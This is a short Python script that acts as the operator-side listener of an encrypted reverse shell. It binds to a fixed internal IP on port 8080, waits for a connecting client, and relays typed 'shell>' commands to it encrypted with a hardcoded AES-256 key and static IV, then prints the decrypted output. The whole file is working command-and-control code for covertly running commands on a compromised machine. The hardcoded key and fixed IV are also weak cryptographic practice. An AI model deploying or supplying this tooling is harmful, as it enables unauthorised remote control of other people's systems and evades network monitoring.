import socket
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# AES Configuration (Must match client!)
KEY = b'ThisIsASecretKey1234567890abcdef'  # 32 bytes for AES-256
IV = b'1234567890abcdef'  # 16 bytes for AES-CBC

def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size)))

def decrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

def start_server():
    host = '192.168.101.150'  # Listen on all interfaces
    port = 8080

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[*] Listening on {host}:{port}")

    client_socket, addr = server.accept()
    print(f"[+] Connection from {addr}")

    while True:
        command = input("shell> ")
        if command.lower() == 'exit':
            break
        client_socket.send(encrypt(command))
        output = decrypt(client_socket.recv(4096))
        print(output)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()
